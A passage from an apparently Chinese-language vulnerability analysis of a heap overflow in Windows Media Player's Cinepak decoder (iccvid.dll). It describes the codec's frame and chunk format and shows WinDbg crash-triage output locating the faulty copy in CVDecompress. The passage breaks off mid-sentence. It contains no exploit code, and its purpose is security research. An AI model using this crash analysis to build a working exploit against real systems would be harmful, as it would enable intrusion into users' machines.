class="line">| v |   |  0.3571 -0.2857 -0.0714 | | b |</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这显然不同于用于<code>颜色空间转换</code>的<code>标准技术</code>，并且之所以选择它是因为它的<code>数学简单性</code>而不是其<code>感知性能</code>。</p><p>&emsp;&emsp;如前所述，可以使用<code>标记为V1</code>的<code>1个8位向量</code>或<code>标记为V4</code>的<code>4个8位向量</code>来对<code>4×4像素块</code>进行编码。这些<code>向量</code>分别引用<code>V1</code>和<code>V4 codebooks</code>。对于<code>V1编码的块</code>，使用<code>单个codebook向量</code>对块进行编码，如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+----+----+----+----+  +---+---+  +---+---+</span><br><span class="line">| y0 | y0 | y1 | y1 |  | u | u |  | v | v |</span><br><span class="line">+----+----+----+----+  +---+---+  +---+---+</span><br><span class="line">| y0 | y0 | y1 | y1 |  | u | u |  | v | v |</span><br><span class="line">+----+----+----+----+  +---+---+  +---+---+</span><br><span class="line">| y2 | y2 | y3 | y3 |</span><br><span class="line">+----+----+----+----+</span><br><span class="line">| y2 | y2 | y3 | y3 |</span><br><span class="line">+----+----+----+----+</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;对于<code>V4编码的块</code>，使用<code>4个codebook表条目</code>对块进行编码。应用于<code>块(block)</code>的<code>4向量参考(r0, r1, r2, r3)</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+------+------+------+------+  +-----+-----+  +-----+-----+</span><br><span class="line">| r0y0 | r0y1 | r1y0 | r1y1 |  | r0u | r1u |  | r0v | r1v |</span><br><span class="line">+------+------+------+------+  +-----+-----+  +-----+-----+</span><br><span class="line">| r0y2 | r0y3 | r1y2 | r1y3 |  | r2u | r3u |  | r2v | r3v |</span><br><span class="line">+------+------+------+------+  +-----+-----+  +-----+-----+</span><br><span class="line">| r2y0 | r2y1 | r3y0 | r3y1 |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| r2y2 | r2y3 | r3y2 | r3y3 |</span><br><span class="line">+------+------+------+------+</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>Cinepak</code>视频序列的<code>典型Frame</code>由以下部分组成:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+</span><br><span class="line">| Frame Header          |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 1 Header        |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 1 Codebooks     |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 1 Frame Vectors |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 2 Header        |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 2 Codebooks     |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 2 Frame Vectors |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 3 Header        |</span><br><span class="line">+-----------------------+</span><br><span class="line">|    .      .      .    |</span><br><span class="line">|    .      .      .    |</span><br><span class="line">|    .      .      .    |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>这些部分</code>中的每一个都有更详细的描述。所有<code>多字节值</code>均以<code>最高有效字节顺序(MSB)</code>排序(即：摩托罗拉顺序,大端)。因此，<code>字节交换</code>需要基于<code>Intel处理器</code>的机器。</p><h4 id="1、Frame-Header"><a href="#1、Frame-Header" class="headerlink" title="1、Frame Header"></a>1、Frame Header</h4><p>&emsp;&emsp;<code>Cinepak</code>视频序列的<code>每一帧(Frame)</code>都以一个<code>Header</code>开头，其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">   +---------------+</span><br><span class="line">0  |             | |       Flags                         Byte</span><br><span class="line">   +---------------+</span><br><span class="line">1  |               |       Length of CVID data           Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">2  |               |</span><br><span class="line">   +-             -+</span><br><span class="line">3  |               |</span><br><span class="line">   +---------------+</span><br><span class="line">4  |               |       Width of coded frame          Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">5  |               |</span><br><span class="line">   +---------------+</span><br><span class="line">6  |               |       Height of coded frame         Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">7  |               |</span><br><span class="line">   +---------------+</span><br><span class="line">8  |               |       Number of coded strips        Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">9  |               |</span><br><span class="line">   +---------------+</span><br></pre></td></tr></table></figure></p><blockquote><ul><li><strong><code>Flags</code></strong> - Flags字段的<code>位0</code>指定<code>每个条(Strip)</code>的<code>codebooks</code>是否使用<code>上一个条(Strip)</code>中定义的<code>codebooks</code>。对于Frame的<code>第一个Strip</code>，<code>先前的Strip</code>可以在<code>先前的Frame</code>中找到。</li><li><strong><code>Length</code></strong> - 此字段指定Frame中的<code>字节总数</code>。</li><li><strong><code>Width</code></strong> - Frame的<code>像素宽度</code>。</li><li><strong><code>Height</code></strong> - Frame的<code>像素高度</code>。</li><li><strong><code>Number of Strips</code></strong> - 用于对Frame进行编码的<code>条(Strips)总数</code>。</li></ul></blockquote><h4 id="2、Strip-Header"><a href="#2、Strip-Header" class="headerlink" title="2、Strip Header"></a>2、Strip Header</h4><p>&emsp;&emsp;<code>帧(Frame)</code>的<code>条(Strips)总数</code>在<code>Frame Header</code>中定义。<code>每个条(Strips)</code>都以<code>Strip Header</code>开始，其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">     7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">    +---------------+</span><br><span class="line"> 0  |               |       Strip CVID ID                 Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 1  |               |</span><br><span class="line">    +---------------+</span><br><span class="line"> 2  |               |       Size of strip data            Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 3  |               |</span><br><span class="line">    +---------------+</span><br><span class="line"> 4  |               |       Strips top Y position         Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 5  |               |</span><br><span class="line">    +---------------+</span><br><span class="line"> 6  |               |       Strips top X position         Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 7  |               |</span><br><span class="line">    +---------------+</span><br><span class="line"> 8  |               |       Strips bottom Y position      Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 9  |               |</span><br><span class="line">    +---------------+</span><br><span class="line">10  |               |       Strips bottom X position      Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line">11  |               |</span><br><span class="line">    +---------------+</span><br></pre></td></tr></table></figure></p><blockquote><ul><li><strong><code>Strip ID</code></strong> - 此ID具有以下两个值之一：<ul><li><strong><code>0x1000</code></strong> - Intra-coded strip</li><li><strong><code>0x1100</code></strong> - Inter-coded strip</li></ul></li><li><strong><code>Size</code></strong> - 用于编码Strip的<code>字节总数</code>。这包括用于<code>codebook定义</code>和<code>编码向量</code>的字节。</li><li><strong><code>Strips X and Y positions</code></strong> - 这4个值定义了<code>条(Strip)</code>所定义的<code>帧(Frame)的区域</code>。</li></ul></blockquote><h4 id="3、CVID-Chunk"><a href="#3、CVID-Chunk" class="headerlink" title="3、CVID Chunk"></a>3、CVID Chunk</h4><p>&emsp;&emsp;在<code>Strip Header</code>之后，<code>每个条(Strip)</code>由一系列<code>块(Chunk)</code>组成，其结构如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">   +---------------+</span><br><span class="line">0  |               |       CVID Chunk ID                 Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">1  |               |</span><br><span class="line">   +---------------+</span><br><span class="line">2  |               |       Size of chunk data (N)        Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">3  |               |</span><br><span class="line">   +---------------+</span><br><span class="line">4  |               |</span><br><span class="line">   +-             -+</span><br><span class="line">5  |               |</span><br><span class="line">   +-   . . . .   -+       Chunk data (N - 4 bytes)      Byte</span><br><span class="line">   |               |</span><br><span class="line">   +-             -+</span><br><span class="line">N  |               |</span><br><span class="line">   +---------------+</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>块(Chunk)</code>以<code>标识号</code>开头，然后是<code>块中的字节数</code>。有几种<code>块类型</code>，列出如下：</p><blockquote><ul><li><strong><code>CVID Chunk ID</code></strong> - <ul><li><strong><code>Intra-coded frames</code></strong>:<ul><li><strong><code>0x2000</code></strong> - 12位V4 codebook中的块列表</li><li><strong><code>0x2200</code></strong> - 12位V1 codebook中的块列表</li><li><strong><code>0x2400</code></strong> - 8位V4 codebook中的块列表</li><li><strong><code>0x2600</code></strong> - 8位V1 codebook中的块列表</li><li><strong><code>0x3000</code></strong> - 用于编码Frame的向量</li><li><strong><code>0x3200</code></strong> - 仅来自V1 codebook的块列表</li></ul></li><li><strong><code>Inter-coded frames</code></strong>:<ul><li><strong><code>0x2100</code></strong> - 更新12位V4 codebook的可选块列表</li><li><strong><code>0x2300</code></strong> - 更新12位V1 codebook的可选块列表</li><li><strong><code>0x2500</code></strong> - 更新8位V4 codebook的可选块列表</li><li><strong><code>0x2700</code></strong> - 更新8位V1 codebook的可选块列表</li><li><strong><code>0x3100</code></strong> - 用于编码一个Frame的向量的选择性集合</li></ul></li></ul></li></ul></blockquote><p>&emsp;&emsp;在<code>Chunk ID</code>和<code>Size</code>之后是<code>块数据</code>。该数据的格式取决于<code>Chunk ID</code>。这些将在以下各节中介绍。</p><h4 id="4、Intra-list-of-codebook-blocks-IDs-0x2000-0x2200-0x2400-0x2600"><a href="#4、Intra-list-of-codebook-blocks-IDs-0x2000-0x2200-0x2400-0x2600" class="headerlink" title="4、Intra list of codebook blocks(IDs 0x2000, 0x2200, 0x2400, 0x2600)"></a>4、Intra list of codebook blocks(IDs 0x2000, 0x2200, 0x2400, 0x2600)</h4><p>&emsp;&emsp;该<code>Chunk</code>是包含<code>codebook条目</code>的列表。<code>每个字节</code>代表一个<code>颜色分量值</code>。在<code>12bpp模式</code>(<code>0x2000</code>和<code>0x2200</code>)中，<code>每6个字节</code>代表一个<code>codebook条目</code>，从<code>向量0</code>开始：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">   +---------------+</span><br><span class="line">0  |               |       Luminance value 0             Byte</span><br><span class="line">   +---------------+</span><br><span class="line">1  |               |       Luminance value 1             Byte</span><br><span class="line">   +---------------+</span><br><span class="line">2  |               |       Luminance value 2             Byte</span><br><span class="line">   +---------------+</span><br><span class="line">3  |               |       Luminance value 3             Byte</span><br><span class="line">   +---------------+</span><br><span class="line">4  |               |       U Chrominance value           Byte</span><br><span class="line">   +---------------+</span><br><span class="line">5  |               |       V Chrominance value           Byte</span><br><span class="line">   +---------------+</span><br><span class="line">6  |       .       |</span><br><span class="line">           .</span><br><span class="line">           .</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;在<code>8bpp模式</code>(<code>0x2400</code>和<code>0x2600</code>)中，每个<code>codebook条目</code>用<code>4个字节</code>(亮度值)定义。块中定义的<code>codebook条目总数</code>取决于<code>块大小</code>(分别为<code>12bpp</code>和<code>8bpp</code>的<code>size/6</code>或<code>size/4</code>)。</p><h4 id="5、Inter-selective-list-of-library-blocks-IDs-0x2100-0x2300-0x2500-0x2700"><a href="#5、Inter-selective-list-of-library-blocks-IDs-0x2100-0x2300-0x2500-0x2700" class="headerlink" title="5、Inter selective list of library blocks(IDs 0x2100, 0x2300, 0x2500, 0x2700)"></a>5、Inter selective list of library blocks(IDs 0x2100, 0x2300, 0x2500, 0x2700)</h4><p>&emsp;&emsp;在<code>inter-frame</code>(或<code>非key-frames</code>)中，来自<code>前一帧的向量</code>可用于<code>当前帧</code>。<code>无法重用的向量</code>可以使用<code>此块</code>进行如下修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">     7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">    +---------------+</span><br><span class="line"> 0  |               |       Update Flags                  Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 1  |               |</span><br><span class="line">    +-             -+</span><br><span class="line"> 2  |               |</span><br><span class="line">    +-             -+</span><br><span class="line"> 3  |               |</span><br><span class="line">    +---------------+</span><br><span class="line"> 4  |               |       Luminance value 0             Byte</span><br><span class="line">    +---------------+</span><br><span class="line"> 5  |               |       Luminance value 1             Byte</span><br><span class="line">    +---------------+</span><br><span class="line"> 6  |               |       Luminance value 2             Byte</span><br><span class="line">    +---------------+</span><br><span class="line"> 7  |               |       Luminance value 3             Byte</span><br><span class="line">    +---------------+</span><br><span class="line"> 8  |               |       U Chrominance value           Byte</span><br><span class="line">    +---------------+</span><br><span class="line"> 9  |               |       V Chrominance value           Byte</span><br><span class="line">    +---------------+</span><br><span class="line">10  |       .       |</span><br><span class="line">            .       </span><br><span class="line">    |       .       |</span><br><span class="line">    +---------------+</span><br><span class="line">    |       .       |       Update Flags                  Unsigned</span><br><span class="line">    +-      .      -+</span><br><span class="line">            .</span><br></pre></td></tr></table></figure></p><blockquote><ul><li><strong><code>Update Flags</code></strong> - <code>每个位</code>指示<code>codebook条目</code>是否<code>被更新</code>。如果<code>该位为1</code>，则<code>codebook条目</code>将被<code>下一个6或4个字节</code>替换(取决于模式)，否则<code>条目位置</code>保持不变。</li></ul></blockquote><h4 id="6、Vectors-used-to-encode-a-frame-ID-0x3000"><a href="#6、Vectors-used-to-encode-a-frame-ID-0x3000" class="headerlink" title="6、Vectors used to encode a frame(ID 0x3000)"></a>6、Vectors used to encode a frame(ID 0x3000)</h4><p>&emsp;&emsp;最初，从块中读取<code>4个字节</code>，它们定义了<code>一组标志</code>。<code>一组标志</code>对<code>32个块</code>进行编码，<code>每个块</code>使用<code>一位</code>。32个1位标志(从flags变量中的<code>最高有效位</code>开始)中的<code>每个标志</code>定义了该块所代表的<code>编码技术</code>。如果<code>标志为1</code>，则将该块<code>编码为V4</code>(4个向量=4个字节)，否则将该块<code>编码为V1</code>(1个向量=1个字节)。解析完<code>32个块</code>之后，必须从块中读取<code>另外4个字节</code>，并将其用作<code>下一组标志</code>。</p><h4 id="7、Selective-set-of-vectors-used-to-encode-a-frame-ID-0x3100"><a href="#7、Selective-set-of-vectors-used-to-encode-a-frame-ID-0x3100" class="headerlink" title="7、Selective set of vectors used to encode a frame(ID 0x3100)"></a>7、Selective set of vectors used to encode a frame(ID 0x3100)</h4><p>&emsp;&emsp;在<code>inter-frame</code>编码中，并非一帧中的<code>所有块</code>都需要<code>更新</code>。与前面的块一样，<code>4个字节</code>代表<code>一组标志</code>，但是在这种情况下，为每个块选择<code>三个编码</code>之一。给定标志位，该块将是：</p><blockquote><ul><li><strong><code>0</code></strong> = 跳过该块</li><li><strong><code>10</code></strong> = V1编码块</li><li><strong><code>11</code></strong> = V4编码块</li></ul></blockquote><p>&emsp;&emsp;也就是说，如果当前<code>标志位为0</code>，则将<code>跳过该块</code>。如果<code>标志位为1</code>，则<code>随后的位</code>将确定使用<code>两种编码类型</code>中的哪一种(可变长度编码(VLC)的简单形式)。</p><h4 id="8、List-of-blocks-from-only-the-V1-codebook-ID-0x3200"><a href="#8、List-of-blocks-from-only-the-V1-codebook-ID-0x3200" class="headerlink" title="8、List of blocks from only the V1 codebook(ID 0x3200)"></a>8、List of blocks from only the V1 codebook(ID 0x3200)</h4><p>&emsp;&emsp;用此<code>块类型</code>编码的所有块均由<code>V1向量</code>表示。即，该块中的<code>每个字节</code>代表<code>每个块</code>的<code>一个向量</code>。</p><h3 id="0x33-定位漏洞点"><a href="#0x33-定位漏洞点" class="headerlink" title="0x33 定位漏洞点"></a>0x33 定位漏洞点</h3><p>&emsp;&emsp;首先打开<code>Windows Media Player</code>，然后用<code>WinDbg</code>附加进程<code>wmplayer.exe</code>，然后通过<code>!gflag</code>命令<code>开启页堆</code>，通过<code>页堆(HeapPage)</code>进行<code>堆溢出漏洞</code>的调试。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">(fdc<span class="meta">.638</span>): Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line"><span class="built_in">eax</span>=7ffdd000 <span class="built_in">ebx</span>=<span class="number">00000001</span> <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=<span class="number">00000003</span> <span class="built_in">esi</span>=<span class="number">00000004</span> <span class="built_in">edi</span>=<span class="number">00000005</span></span><br><span class="line"><span class="built_in">eip</span>=7c92120e <span class="built_in">esp</span>=01d0ffcc <span class="built_in">ebp</span>=01d0fff4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=<span class="number">0038</span>  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c92120e cc              <span class="keyword">int</span>     <span class="number">3</span></span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; !gflag +hpa</span><br><span class="line">New NtGlobalFlag contents: <span class="number">0x02000000</span></span><br><span class="line">    hpa - Place heap allocations <span class="meta">at</span> ends of pages</span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> 7cf70000 7d0d9000   C:\WINDOWS\system32\quartz.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 75af0000 75b01000   C:\WINDOWS\system32\devenum.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">73620000</span> <span class="number">73627000</span>   C:\WINDOWS\system32\msdmo.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">76320000</span> <span class="number">76367000</span>   C:\WINDOWS\system32\comdlg32.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 76d70000 76d92000   C:\WINDOWS\system32\appHelp.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">76590000</span> 765de000   C:\WINDOWS\System32\cscui.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">76570000</span> 7658c000   C:\WINDOWS\System32\CSCDLL.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 75ef0000 75fed000   C:\WINDOWS\system32\browseui.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">76960000</span> <span class="number">76984000</span>   C:\WINDOWS\system32\ntshrui.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 76af0000 76b01000   C:\WINDOWS\system32\ATL.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 759d0000 75a7f000   C:\WINDOWS\system32\USERENV.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">76950000</span> <span class="number">76958000</span>   C:\WINDOWS\system32\LINKINFO.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 736d0000 7371b000   C:\WINDOWS\system32\DDRAW.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 73b30000 73b36000   C:\WINDOWS\system32\DCIMAN32.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 738b0000 <span class="number">73980000</span>   C:\WINDOWS\system32\D3DIM700.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 73b70000 73b87000   C:\WINDOWS\system32\iccvid.dll</span><br><span class="line">(fdc.cf4): Access violation - code c0000005 (first chance) &lt;---- 内存访问违例</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00006000</span> <span class="built_in">ebx</span>=00140a18 <span class="built_in">ecx</span>=<span class="number">00000298</span> <span class="built_in">edx</span>=0221fd38 <span class="built_in">esi</span>=<span class="number">00146000</span> <span class="built_in">edi</span>=<span class="number">00148000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=0221fd04 <span class="built_in">ebp</span>=0221fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</span><br><span class="line"><span class="number">0</span>:<span class="number">015</span>&gt; !address <span class="number">00148000</span></span><br><span class="line"><span class="symbol">Usage:</span>                  &lt;unclassified&gt;</span><br><span class="line">Allocation Base:        <span class="number">00090000</span></span><br><span class="line">Base Address:           <span class="number">00148000</span></span><br><span class="line">End Address:            <span class="number">00190000</span></span><br><span class="line">Region Size:            <span class="number">00048000</span></span><br><span class="line"><span class="symbol">Type:</span>                   <span class="number">00020000</span>    MEM_PRIVATE</span><br><span class="line"><span class="symbol">State:</span>                  <span class="number">00002000</span>    MEM_RESERVE</span><br><span class="line"><span class="symbol">Protect:</span>                <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">015</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0221fd30 73b7cbf3 <span class="number">00000004</span> <span class="number">00000000</span> <span class="number">00000068</span> iccvid!CVDecompress+<span class="number">0x11e</span>(<span class="number">0x73b722cc</span>当前指令地址)</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">0221fd60 73b766c8 0013abc0 <span class="number">00000000</span> 0013de88 iccvid!Decompress+<span class="number">0x11d</span>(<span class="number">0x73b7cbf3</span>)[73b7cbee <span class="keyword">call</span> iccvid!CVDecompress (73b721ae)的返回地址]</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">0221fdac 73b41938 0013abc0 <span class="number">00000001</span> <span class="number">0000400d</span> iccvid!DriverProc+<span class="number">0x1bf</span>(<span class="number">0x73b766c8</span>)[73b766c3 <span class="keyword">call</span> iccvid!Decompress (73b7cad6)的返回地址]</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;开启<code>页堆(HeapPage)</code>后，运行程序，会发生<code>内存访问异常</code>(异常代码:<code>0xC0000005h</code>)而中断，通过以上调试信息，可以看出<code>0x73b722cc</code>处的<code>内存复制指令</code>发生<code>内存访问异常</code>。此时的<code>edi</code>指向的内存的<code>内存状态(State)</code>为<code>MEM_RESERVE</code>，即<code>保留内存</code>，保留内存尚不能被<code>实际使用</code>，但其地址空间已被预留，尚需一个<code>提交动作</code>。所以<code>edi</code>指向的内存是<code>不能访问</code>的。</p><p>&emsp;&emsp;查看此时的<code>栈回溯</code>，我们可以知道<code>触发异常</code>的指令位于<code>iccvid.dll</code>中的<code>CVDecompress函数</code>中，其父函数为<code>iccvid!Decompress</code>。调用<code>CVDecompress函数</code>的指令位于地址<code>0x73b7cbee</code>处，我们需要对此地址<code>下断点</code>，才能进入<code>CVDecompress函数</code>，分析其<code>功能</code>。但是，由于该地址位于<code>iccvid.dll</code>模块中，而<code>iccvid.dll</code>只有在解析<code>poc.avi</code>时才会被<code>动态加载</code>。若重新<code>附加进程</code>，是<code>未加载</code>iccvid.dll模块的，这里有<code>两种解决方案</code>。</p><blockquote><ul><li>1、利用<code>OllyDbg</code>或<code>Immunity Debugger</code>调试器附加进程<code>wmplayer.exe</code>，<code>F9</code>运行后，打开<code>poc.avi</code>，会中断在<code>异常</code>处，此时已经加载了<code>iccvid.dll</code>，现在对地址<code>0x73b7cbee</code>下断点，<code>断点信息</code>会保存在<code>.udd</code>文件中。或者通过<code>插件</code>注入<code>iccvid.dll</code>后下断点。<code>正常情况</code>下，下次重新附加<code>wmplayer.exe</code>，<code>F9</code>运行后重新打开<code>poc.avi</code>，加载<code>iccvid.dll</code>时会<code>激活断点</code>，之后就会断在地址<code>0x73b7cbee</code>处。但是好像<code>OllyDbg</code>或<code>Immunity Debugger</code>有<code>Bug</code>，无法在<code>加载iccvid.dll</code>时，自动<code>激活断点</code>，打开<code>模块窗口</code>后，断点才会<code>激活</code>，所以无法断在断点处。使用<code>OllyDbg v2.0</code>或<code>x64dbg</code>可以解决此问题。</li><li>2、利用<code>WinDbg</code>的<code>sxe 